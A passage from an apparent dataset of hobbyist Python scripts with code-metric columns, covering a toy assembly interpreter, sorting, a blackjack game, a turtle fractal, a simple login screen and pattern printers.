                        token += ch

                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 9:  # state 9

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 10:  # state 10

                match ch:
                    case ""u"":

                        state = 11
                        token += ch

                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 11:  # state 11

                match ch:
                    case ""b"":

                        state = 12
                        token += ch

                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 12:  # state 12

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 13:  # state 13

                if ch == "","" or ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""register""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 14:  # state 14

                if ch == ""n"":

                    state = 15
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 15:  # state 15

                if ch == ""t"":

                    state = 16
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 16:  # state 16

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 17:  # state 17

                if ch == ""x"":

                    state = 18
                    token += ch

                elif ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""value""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 18:  # state 18

                if ch.isdigit() or (ch >= ""a"" and ch <= ""f""):

                    state = 18
                    token += ch

                elif ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""value""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 19:  # state 19

                if ch == ""u"":

                    state = 20
                    token += ch

                elif ch == ""o"":

                    state = 23
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 20:  # state 20

                if ch == ""s"":

                    state = 21
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 21:  # state 21

                if ch == ""h"":

                    state = 22
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 22:  # state 22

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 23:  # state 23

                if ch == ""p"":

                    state = 24
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 24:  # state 24

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 25:  # state 25

                if ch.isdigit():

                    state = 25
                    token += ch

                elif ch == "":"" or ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""label""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 26:  # state 26

                if ch == ""m"":

                    state = 27
                    token += ch

                elif ch == ""e"":  # catch je command

                    state = 32
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 27:  # state 27

                if ch == ""p"":

                    state = 28
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 28:  # state 28

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 29:  # state 29
                
                match ch:
                    case ""m"":

                        state = 30
                        token += ch

                    case ""a"":  # catch call-command

                        state = 41
                        token += ch

                    case _:  # error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 30:  # state 30

                if ch == ""p"":

                    state = 31
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 31:  # state 31

                token = """"

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))

                else:  # error case

                    state = 0
                    raise InvalidSyntax()

            case 32:  # state 32

                token = """"

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))

                else:  # error case

                    state = 0
                    raise InvalidSyntax()

            case 33:  # state 33

                if (
                    ch.isdigit()
                    or ch.isalpha()
                    or (ch.isspace() and ch != ""\n"")
                    or ch == '""'
                ):

                    state = 33

                elif ch == ""\n"":

                    state = 0

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 34:  # state 34

                if ch.isdigit() or ch.isalpha() or ch.isspace():

                    state = 34
                    token += ch

                elif ch == '""':

                    state = 0
                    tokens.append(Token(token, ""string""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 35:  # state 35

                if ch.isdigit() or ch.isupper():

                    state = 35
                    token += ch

                elif ch == "" "" or ch == ""\n"":

                    state = 0
                    tokens.append(Token(token, ""identifier""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 36:  # state 36

                if ch == ""b"":

                    state = 37
                    token += ch

                elif ch == ""i"":

                    state = 49
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 37:  # state 37

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 38:  # state 38

                if ch.isalpha():

                    state = 39
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 39:  # state 39

                if ch.isalpha() or ch.isdigit():

                    state = 39
                    token += ch

                elif ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""identifier""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 40:  # state 40

                if (
                    (ch >= ""a"" and ch <= ""z"")
                    or (ch >= ""A"" and ch <= ""Z"")
                    or (ch >= ""0"" and ch <= ""9"")
                ):

                    state = 40
                    token += ch

                elif ch == "":"" or ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""subprogram""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 41:  # state 41

                match ch:
                    case ""l"":

                        state = 42
                        token += ch
                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 42:  # state 42

                match ch:
                    case ""l"":

                        state = 43
                        token += ch
                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 43:  # state 43

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 44:  # state 44

                match ch:
                    case ""e"":

                        state = 45
                        token += ch
                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 45:  # state 45

                match ch:
                    case ""t"":

                        state = 46
                        token += ch
                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 46:  # state 46

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 47:  # state 47

                match ch:
                    case ""l"":

                        state = 48
                        token += ch
                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 48:  # state 48

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 49:  # state 49

                match ch:
                    case ""v"":

                        state = 50
                        token += ch
                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 50:  # state 50

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()


def scan():
    """"""
    scan: applys function scanner() to each line of the source code.
    """"""
    global lines
    assert len(lines) > 0, ""no lines""
    for line in lines:
        try:
            scanner(line)
        except InvalidSyntax:
            print(""line="", line)


def parser():
    """"""
    parser: parses the tokens of the list 'tokens'
    """"""

    global tokens
    global eax, ebx, ecx, edx

    assert len(tokens) > 0, ""no tokens""

    pointer = 0  # pointer for tokens
    token = Token("""", """")
    tmpToken = Token("""", """")

    while pointer < len(tokens):

        token = tokens[pointer]

        if token.token == ""mov"":  # mov commando

            # it must follow a register
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print(""Error: Not found argument!"")
                return

            # TODO use token.t for this stuff
            if token.t == ""register"":

                tmpToken = token

                # it must follow a value / string / register / variable
                if pointer + 1 < len(tokens):
                    pointer += 1
                    token = tokens[pointer]
                else:
                    print(""Error: Not found argument!"")
                    return

                # converts the token into float, if token contains only digits.
                # TODO response of float
                if token.t == ""identifier"":  # for variables

                    # check of exists of variable
                    if token.token in variables:
                        token.token = variables[token.token]
                    else:
                        print(""Error: undefine variable! --> "" + token.token)
                        return
                elif token.t == ""string"":
                    pass
                elif isinstance(token.token, float):
                    pass
                elif token.token.isdigit():
                    token.token = float(token.token)
                elif token.token[0] == ""-"" and token.token[1:].isdigit():
                    token.token = float(token.token[1:])
                    token.token *= -1
                elif token.t == ""register"":  # loads out of register
                    match token.token:
                        case ""eax"":
                            token.token = eax
                        case ""ebx"":
                            token.token = ebx
                        case ""ecx"":
                            token.token = ecx
                        case ""edx"":
                            token.token = edx

                match tmpToken.token:
                    case ""eax"":
                        eax = token.token
                    case ""ebx"":
                        ebx = token.token
                    case ""ecx"":
                        ecx = token.token
                    case ""edx"":
                        edx = token.token

            else:

                print(""Error: No found register!"")
                return

        elif token.token == ""add"":  # add commando

            pointer += 1
            token = tokens[pointer]

            if token.t == ""register"":

                tmpToken = token

                if pointer + 1 < len(tokens):
                    pointer += 1
                    token = tokens[pointer]
                else:
                    print(""Error: Not found number!"")
                    return

                # converts the token into float, if token contains only digits.
                if token.t == ""register"":

                    # for the case that token is register
                    match token.token:
                        case ""eax"":
                            token.token = eax
                        case ""ebx"":
                            token.token = ebx
                        case ""ecx"":
                            token.token = ecx
                        case ""edx"":
                            token.token = edx

                elif token.token.isdigit():
                    token.token = float(token.token)
                elif token.token[0] == ""-"" and token.token[1:].isdigit():
                    token.token = float(token.token[1:])
                    token.token *= -1
                else:
                    print(""Error: "", token, "" is not a number!"")
                    return

                match tmpToken.token:

                    case ""eax"":
                        eax += token.token

                        # update zero flag
                        zeroFlag = False
                        if eax == 0:
                            zeroFlag = True
                    
                    case ""ebx"":
                        ebx += token.token

                        # update zero flag
                        zeroFlag = False
                        if ebx == 0:
                            zeroFlag = True
                    
                    case ""ecx"":
                        ecx += token.token

                        # update zero flag
                        zeroFlag = False
                        if ecx == 0:
                            zeroFlag = True
                    
                    case ""edx"":
                        edx += token.token

                        # update zero flag
                        zeroFlag = False
                        if edx == 0:
                            zeroFlag = True

            else:

                print(""Error: Not found register!"")
                return

        elif token.token == ""sub"":  # sub commando

            pointer += 1
            token = tokens[pointer]

            if token.t == ""register"":

                tmpToken = token

                if pointer + 1 < len(tokens):
                    pointer += 1
                    token = tokens[pointer]
                else:
                    print(""Error: Not found number!"")
                    return

                # converts the token into float, if token contains only digits.
                if token.t == ""register"":

                    # for the case that token is register
                    if token.token == ""eax"":
                        token.token = eax
                    elif token.token == ""ebx"":
                        token.token = ebx
                    elif token.token == ""ecx"":
                        token.token = ecx
                    elif token.token == ""edx"":
                        token.token = edx

                elif isinstance(token.token, float):
                    pass
                elif token.token.isdigit():
                    token.token = float(token.token)
                elif token.token[0] == ""-"" and token.token[1:].isdigit():
                    token.token = float(token.token[1:])
                    token.token *= -1
                else:
                    print(""Error: "", token.token, "" is not a number!"")
                    return

                if tmpToken.token == ""eax"":
                    eax -= token.token

                    # updated zero flag
                    if eax == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == ""ebx"":
                    ebx -= token.token

                    # update zero flag
                    if ebx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == ""ecx"":
                    ecx -= token.token

                    # update zero flag
                    if ecx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False
                elif tmpToken.token == ""edx"":
                    edx -= token.token

                    # update zero flag
                    if edx == 0:
                        zeroFlag = True
                    else:
                        zeroFlag = False

            else:

                print(""Error: No found register!"")
                return

        elif token.token == ""int"":  # int commando

            tmpToken = token

            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print(""Error: Not found argument!"")
                return

            if token.token == ""0x80"":  # system interrupt 0x80

                if eax == 1:  # exit program

                    if ebx == 0:
                        print(""END PROGRAM"")
                        return
                    else:
                        print(""END PROGRAM WITH ERRORS"")
                        return

                elif eax == 3:

                    ecx = float(input("">> ""))

                elif eax == 4:  # output informations

                    print(ecx)

        elif token.token == ""push"":  # push commando

            tmpToken = token

            # it must follow a register
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print(""Error: Not found register!"")
                return

            # pushing register on the stack
            stack.append(token.token)

        elif token.token == ""pop"":  # pop commando

            tmpToken = token

            # it must follow a register
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print(""Error: Not found register!"")
                return

            # pop register from stack
            match token.token:
                case ""eax"":
                    eax = stack.pop()
                case ""ebx"":
                    ebx = stack.pop()
                case ""ecx"":
                    ecx = stack.pop()
                case ""edx"":
                    edx = stack.pop()

        elif token.t == ""label"":  # capture label

            jumps[token.token] = pointer

        elif token.token == ""jmp"":  # capture jmp command

            # it must follow a label
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print(""Error: Not found label!"")
                return

            if token.t == ""label"":

                pointer = jumps[token.token]

            else:
                print(""Error: expected a label!"")

        elif token.token == ""cmp"":
            # TODO

            # it must follow a register
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]
            else:
                print(""Error: Not found argument!"")
                return

            if token.t == ""register"":

                # it must follow a register
                if pointer + 1 < len(tokens):
                    pointer += 1
                    tmpToken = tokens[pointer]  # next register
                else:
                    print(""Error: Not found register!"")
                    return

                # actual comparing
                zeroFlag = setZeroFlag(token.token, tmpToken.token)
                

        elif token.token == ""je"":

            # it must follow a label
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]  # next register
            else:
                print(""Error: Not found argument"")
                return

            # check of label
            if token.t == ""label"":

                # actual jump
                if zeroFlag:
                    pointer = jumps[token.token]

            else:

                print(""Error: Not found label"")
                return

        elif token.t == ""identifier"":

            # check whether identifier is in variables-table
            if token.token not in variables:

                # it must follow a command
                if pointer + 1 < len(tokens):
                    pointer += 1
                    tmpToken = tokens[pointer]  # next register
                else:
                    print(""Error: Not found argument"")
                    return

                if tmpToken.t == ""command"" and tmpToken.token == ""db"":

                    # it must follow a value (string)
                    if pointer + 1 < len(tokens):
                        pointer += 1
                        tmpToken = tokens[pointer]  # next register
                    else:
                        print(""Error: Not found argument"")
                        return

                    if tmpToken.t == ""value"" or tmpToken.t == ""string"":

                        if tmpToken.t == ""value"":
                            variables[token.token] = float(tmpToken.token)
                        elif tmpToken.t == ""string"":
                            variables[token.token] = tmpToken.token

                else:

                    print(""Error: Not found db-keyword"")
                    return

        elif token.token == ""call"":  # catch the call-command

            # it must follow a subprogram label
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]  # next register
            else:
                print(""Error: Not found subprogram label"")
                return

            if token.t == ""subprogram"":

                if token.token in jumps:

                    # save the current pointer
                    returnStack.append(pointer)  # eventuell pointer + 1
                    # jump to the subprogram
                    pointer = jumps[token.token]

                else:  # error case

                    print(""Error: Unknow subprogram!"")
                    return

            else:  # error case

                print(""Error: Not found subprogram"")
                return

        elif token.token == ""ret"":  # catch the ret-command

            if len(returnStack) >= 1:

                pointer = returnStack.pop()

            else:  # error case

                print(""Error: No return adress on stack"")
                return

        elif token.t == ""subprogram"":

            pass

        elif token.token == ""mul"":  # catch mul-command

            # it must follow a register
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]  # next register
            else:
                print(""Error: Not found argument"")
                return

            if token.t == ""register"":

                if token.token == ""eax"":

                    eax *= eax

                elif token.token == ""ebx"":

                    eax *= ebx

                elif token.token == ""ecx"":

                    eax *= ecx

                elif token.token == ""edx"":

                    eax *= edx

            else:

                print(""Error: Not found register"")
                return

        elif token.token == ""div"":

            # it must follow a register
            if pointer + 1 < len(tokens):
                pointer += 1
                token = tokens[pointer]  # next register
            else:
                print(""Error: Not found argument"")
                return

            if token.t == ""register"":
                
                match token.token:
                    case ""eax"":
                        eax /= eax

                    case ""ebx"":
                        eax /= ebx

                    case ""ecx"":
                        eax /= ecx

                    case ""edx"":
                        eax /= edx

            else:

                print(""Error: Not found register"")
                return

        # increment pointer for fetching next token.
        pointer += 1

def setZeroFlag(token, tmpToken):
    """""" return bool for zero flag based on the regToken """"""
    global eax, ebx, ecx, edx

    # Register in string
    registers = {
        ""eax"": eax,
        ""ebx"": ebx,
        ""ecx"": ecx,
        ""edx"": edx,
    }

    zeroFlag = False

    match tmpToken:
        case ""eax"":
            if registers.get(token) == registers.get(tmpToken):
                zeroFlag = True

        case ""ebx"":
            if registers.get(token) == registers.get(tmpToken):
                zeroFlag = True

        case ""ecx"":
            if registers.get(token) == registers.get(tmpToken):
                zeroFlag = True

        case ""edx"":
            if registers.get(token) == registers.get(tmpToken):
                zeroFlag = True

        case _:
            print(""Error: Not found register!"")
            return

    return zeroFlag

def registerLabels():
    """"""
    This function search for labels / subprogram-labels and registers this in the 'jumps' list.
    """"""
    for i in range(len(tokens)):
        if tokens[i].t == ""label"":
            jumps[tokens[i].token] = i
        elif tokens[i].t == ""subprogram"":
            jumps[tokens[i].token] = i


def resetInterpreter():
    """"""
    resets the interpreter mind.
    """"""
    global eax, ebx, ecx, edx, zeroFlag, stack
    global variables, jumps, lines, tokens, returnStack
    eax = 0
    ebx = 0
    ecx = 0
    edx = 0
    zeroFlag = False
    stack = []
    jumps = {}
    variables = {}
    lines = []
    tokens = []
    returnStack = []


# DEBUG FUNCTION
# def printTokens():
#     for token in tokens:
#         print(token.token, "" --> "", token.t)


# main program
def main():
    """"""
    reads textfiles from the command-line and interprets them.
    """"""

    # [1:] because the first argument is the program itself.
    for arg in sys.argv[1:]:

        resetInterpreter()  # resets interpreter mind

        try:

            loadFile(arg)
            scan()
            registerLabels()
            parser()

        except Exception as e:

            print(f""Error: {e}"")


if __name__ == ""__main__"":
    main()
",39141,982,984,500,215,64,22,10.0,306,262,15,525.0,170,185.0,787,1318.1998180775372,5927.197209426337,23.16176470588235,bajo,Yes,True,False,,id73
brickSort.py,"# Python Program to implement
# Odd-Even / Brick Sort


def oddEvenSort(arr, n):
    # Initially array is unsorted
    isSorted = 0
    while isSorted == 0:
        isSorted = 1
        temp = 0
        for i in range(1, n - 1, 2):
            if arr[i] > arr[i + 1]:
                arr[i], arr[i + 1] = arr[i + 1], arr[i]
                isSorted = 0

        for i in range(0, n - 1, 2):
            if arr[i] > arr[i + 1]:
                arr[i], arr[i + 1] = arr[i + 1], arr[i]
                isSorted = 0

    return


arr = [34, 2, 10, -9]
n = len(arr)

oddEvenSort(arr, n)
for i in range(0, n):
    print(arr[i], end="" "")
",631,19,19,7,3,3,0,1.0,6,12,5,23.0,10,,35,44.82892142331043,136.74117084629816,5.75,medio,No,False,False,Low-Medium,id74
dict1.py,"#!/usr/bin/env python

counts = dict()
mails = list()
fname = input(""Enter file name:"")
fh = open(fname)
for line in fh:
    if not line.startswith(""From ""):
        continue
    #   if line.startswith('From:'):
    #       continue
    id = line.split()
    mail = id[1]
    mails.append(mail)

freq_mail = max(mails, key=mails.count)  # To find frequent mail
print(freq_mail, mails.count(freq_mail))  # To find countof frequent mail


""""""
for x in mails:
    counts[x]=counts.get(x,0)+1
bigmail=None
bigvalue=None
for key,value in counts.items():
    if bigvalue==None or bigvalue<value:
        bigmail=key
        bigvalue=value
print(bigmail, bigvalue)

""""""
",663,13,12,5,5,3,11,0.0,0,1,1,1.0,1,,2,0.0,2.0,0.5,alto,No,True,False,Low,id75
videodownloder.py,"from pytube import YouTube 

#location where you save.
PATH = ""E:/"" #to_do 

#link of video.
link=[""https://www.youtube.com/watch?v=p8FuTenSWPI"", 
	""https://www.youtube.com/watch?v=JWbnEt3xuos""
	]#list of video links. 
for i in link: 
	try: 
		yt = YouTube(i) 
	except: 
		print(""Connection Error"") #to handle exception 
	
	#check files with ""mp4"" extension 
	mp4files = yt.filter('mp4') 

	d_video = yt.get(mp4files[-1].extension,mp4files[-1].resolution) 
	try: 
		d_video.download(PATH) 
	except: 
		print(""Some Error!"") 
print('Task Completed!') 
",550,15,17,4,6,3,0,0.0,0,2,1,2.0,1,,4,0.0,4.0,1.0,alto,No,False,False,Low,id76
login.py,"import os
from getpass import getpass

# Devloped By Black_angel
# This is Logo Function
def logo():
    print("" ââââââââââââââââââââââââââââââââââââââââââââââââââââââââ "")
    print("" |                                                        | "")
    print("" |   ########    ##  #########  ##       ##      ###      | "")
    print("" |   ##     ##   ##  ##         ##       ##    ##   ##    | "")
    print("" |   ##     ###  ##  ##         ##       ##   ##     ##   | "")
    print("" |   ##     ###  ##  #########  ###########  ##########   | "")
    print("" |   ##     ###  ##         ##  ##       ##  ##      ##   | "")
    print("" |   ##     ##   ##         ##  ##       ##  ##      ##   | "")
    print("" |   ########    ##  #########  ##       ##  ##      ##   | "")
    print("" |                                                        | "")
    print("" \033[1;91m|   || Digital Information Security Helper Assistant ||  | "")
    print("" |                                                        | "")
    print("" ââââââââââââââââââââââââââââââââââââââââââââââââââââââââ "")
    print(""\033[1;36;49m"")


# This is Login Funtion
def login():
    # for clear the screen
    os.system(""clear"")
    print(""\033[1;36;49m"")
    logo()
    print(""\033[1;36;49m"")
    print("""")
    usr = input(""Enter your Username : "")
    # This is username you can change here
    usr1 = ""raj""
    psw = getpass(""Enter Your Password : "")
    # This is Password you can change here
    psw1 = ""5898""
    if usr == usr1 and psw == psw1:
        print(""\033[1;92mlogin successfully"")
        os.system(""clear"")
        print(""\033[1;36;49m"")
        logo()
    else:
        print(""\033[1;91m Wrong"")

        login()


# This is main function
if __name__ == ""__main__"":
    login()
",1976,37,37,6,7,7,0,2.0,4,4,2,8.0,8,,12,26.0,39.86313713864836,1.0,medio,No,True,False,Low,id77
sierpinski_triangle.py,"""""""Author Anurag Kumar | anuragkumarak95@gmail.com | git/anuragkumarak95

Simple example of Fractal generation using recursive function.

What is Sierpinski Triangle?
>>The Sierpinski triangle (also with the original orthography Sierpinski), also called the Sierpinski gasket or the Sierpinski Sieve, 
is a fractal and attractive fixed set with the overall shape of an equilateral triangle, subdivided recursively into smaller 
equilateral triangles. Originally constructed as a curve, this is one of the basic examples of self-similar sets, i.e., 
it is a mathematically generated pattern that can be reproducible at any magnification or reduction. It is named after 
the Polish mathematician WacÅaw Sierpinski, but appeared as a decorative pattern many centuries prior to the work of Sierpinski.

Requirements(pip):
  - turtle

Python:
  - 2.6

Usage:
  - $python sierpinski_triangle.py <int:depth_for_fractal>

Credits: This code was written by editing the code from http://www.lpb-riannetrujillo.com/blog/python-fractal/

""""""
import sys
import turtle

PROGNAME = ""Sierpinski Triangle""
if len(sys.argv) != 2:
    raise Exception(
        ""right format for using this script: $python fractals.py <int:depth_for_fractal>""
    )

myPen = turtle.Turtle()
myPen.ht()
myPen.speed(5)
myPen.pencolor(""red"")

points = [[-175, -125], [0, 175], [175, -125]]  # size of triangle


def getMid(p1, p2):
    return ((p1[0] + p2[0]) / 2, (p1[1] + p2[1]) / 2)  # find midpoint


def triangle(points, depth):
    myPen.up()
    myPen.goto(points[0][0], points[0][1])
    myPen.down()
    myPen.goto(points[1][0], points[1][1])
    myPen.goto(points[2][0], points[2][1])
    myPen.goto(points[0][0], points[0][1])

    if depth > 0:
        triangle(
            [points[0], getMid(points[0], points[1]), getMid(points[0], points[2])],
            depth - 1,
        )
        triangle(
            [points[1], getMid(points[0], points[1]), getMid(points[1], points[2])],
            depth - 1,
        )
        triangle(
            [points[2], getMid(points[2], points[1]), getMid(points[0], points[2])],
            depth - 1,
        )


triangle(points, int(sys.argv[1]))
",2163,25,35,17,2,0,16,2.0,3,12,6,21.0,14,,33,68.81274391313339,142.62362713128297,4.5,alto,No,False,False,Low-Medium,id78
blackjack.py,"# master
# master
# BLACK JACK - CASINO A GAME OF FORTUNE!!!
from time import *

# BLACK JACK - CASINO
# PYTHON CODE BASE


# master
import random

deck = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 10, 10, 10, 11] * 4

random.shuffle(deck)

print(f'{""*""*58} \n Welcome to the game Casino - BLACK JACK ! \n{""*""*58}')
sleep(2)
print(""So Finally You Are Here To Accept Your Fate"")
sleep(2)
print(""I Mean Your Fortune"")
sleep(2)
print(""Lets Check How Lucky You Are  Wish You All The Best"")
sleep(2)
print(""Loading---"")
sleep(2)

print(""Still Loading---"")
sleep(2)
print(
    ""So You Are Still Here Not Gone I Gave You Chance But No Problem May Be You Trust Your Fortune A Lot \n Lets Begin Then""
)
sleep(2)
d_cards = []  # Initialising dealer's cards
p_cards = []  # Initialising player's cards
sleep(2)
while len(d_cards) != 2:
    random.shuffle(deck)
    d_cards.append(deck.pop())
    if len(d_cards) == 2:
        print(""The cards dealer has are X "", d_cards[1])

# Displaying the Player's cards
while len(p_cards) != 2:
    random.shuffle(deck)
    p_cards.append(deck.pop())
    if len(p_cards) == 2:
        print(""The total of player is "", sum(p_cards))
        print(""The cards Player has are  "", p_cards)

if sum(p_cards) > 21:
    print(f""You are BUSTED !\n  {'*'*14}Dealer Wins !!{'*'*14}\n"")
    exit()

if sum(d_cards) > 21:
    print(f""Dealer is BUSTED !\n   {'*'*14} You are the Winner !!{'*'*18}\n"")
    exit()

if sum(d_cards) == 21:
    print(f""{'*'*24}Dealer is the Winner !!{'*'*14}"")
    exit()

if sum(d_cards) == 21 and sum(p_cards) == 21:
    print(f""{'*'*17}The match is tie !!{'*'*25}"")
    exit()


# function to show the dealer's choice
def dealer_choice():
    if sum(d_cards) < 17:
        while sum(d_cards) < 17:
            random.shuffle(deck)
            d_cards.append(deck.pop())

    print(""Dealer has total "" + str(sum(d_cards)) + ""with the cards "", d_cards)

    if sum(p_cards) == sum(d_cards):
        print(f""{'*'*15}The match is tie !!{'*'*15}"")
        exit()

    if sum(d_cards) == 21:
        if sum(p_cards) < 21:
            print(f""{'*'*23}Dealer is the Winner !!{'*'*18}"")
        elif sum(p_cards) == 21:
            print(f""{'*'*20}There is tie !!{'*'*26}"")
        else:
            print(f""{'*'*23}Dealer is the Winner !!{'*'*18}"")

    elif sum(d_cards) < 21:
        if sum(p_cards) < 21 and sum(p_cards) < sum(d_cards):
            print(f""{'*'*23}Dealer is the Winner !!{'*'*18}"")
        if sum(p_cards) == 21:
            print(f""{'*'*22}Player is winner !!{'*'*22}"")
        if 21 > sum(p_cards) > sum(d_cards):
            print(f""{'*'*22}Player is winner !!{'*'*22}"")

    else:
        if sum(p_cards) < 21:
            print(f""{'*'*22}Player is winner !!{'*'*22}"")
        elif sum(p_cards) == 21:
            print(f""{'*'*22}Player is winner !!{'*'*22}"")
        else:
            print(f""{'*'*23}Dealer is the Winner !!{'*'*18}"")


while sum(p_cards) < 21:

    # to continue the game again and again !!
    k = input(""Want to hit or stay?\n Press 1 for hit and 0 for stay "")
    if k == ""1"": #Ammended 1 to a string
        random.shuffle(deck)
        p_cards.append(deck.pop())
        print(""You have a total of "" + str(sum(p_cards)) + "" with the cards "", p_cards)
        if sum(p_cards) > 21:
            print(f'{""*""*13}You are BUSTED !{""*""*13}\n Dealer Wins !!')
        if sum(p_cards) == 21:
            print(f'{""*""*19}You are the Winner !!{""*""*29}')

    else:
        dealer_choice()
        break
",3467,87,89,23,12,9,0,1.0,14,68,7,135.0,65,,203,411.1053923012527,1252.4947752927894,7.269230769230769,bajo,No,True,True,High,id79
half triangle pattern.py,"    # (upper half - repeat)
    #1
    #22
    #333

    # (upper half - incremental)
    #1
    #12
    #123
  
    # (lower half - incremental)
    #123
    #12
    #1

    # (lower half - repeat)
    #333
    #22
    #1

def main():
    lines = int(input(""Enter no.of lines: ""))
    pattern = input(""i: increment or r:repeat pattern: "").lower()
    part = input(""u: upper part or l: lower part: "").lower()

    match pattern:
        case ""i"":
            if part == ""u"":
                upper_half_incremental_pattern(lines)
            else:
                lower_half_incremental_pattern(lines)

        case ""r"":
            if part == ""u"":
                upper_half_repeat_pattern(lines)
            else:
                lower_half_repeat_pattern(lines)

        case _:
            print(""Invalid input"")
            exit(0)

def upper_half_repeat_pattern(lines):

    t = 1
    for column in range(1, (lines +1)):
        print(f""{str(t) * column}"")
        t += 1

def upper_half_incremental_pattern(lines):

    for column in range(1, (lines +1)):
        row = """"
        for ii in range(1, column +1):
            row += str(ii)
        print(row)
            

def lower_half_incremental_pattern(lines):

    for row_length in range(lines, 0, -1):
        row = """"
        column = 1

        for _ in range(row_length):
            column = 0 if column == 10 else column
            row = f""{row}{column}""
            column += 1

        print(row)

def lower_half_repeat_pattern(lines):

    for row_length in range(lines, 0, -1):
        
        row = """"
        for _ in range(1, row_length+1):
            row += str(row_length)
        print(row)

if __name__ == ""__main__"":
    main()
",1711,46,46,20,16,16,0,5.0,17,15,4,28.0,21,,43,100.23866587835396,199.68581616031315,2.6666666666666665,medio,No,True,False,Low-Medium,id80
check whether the string is Symmetrical or Palindrome.py,"def palindrome(a): 
   
    mid = (len(a)-1)//2
    start = 0
    last = len(a)-1
    flag = 0
  
    while(start<mid): 
   
        if (a[start]== a[last]): 
              
            start += 1
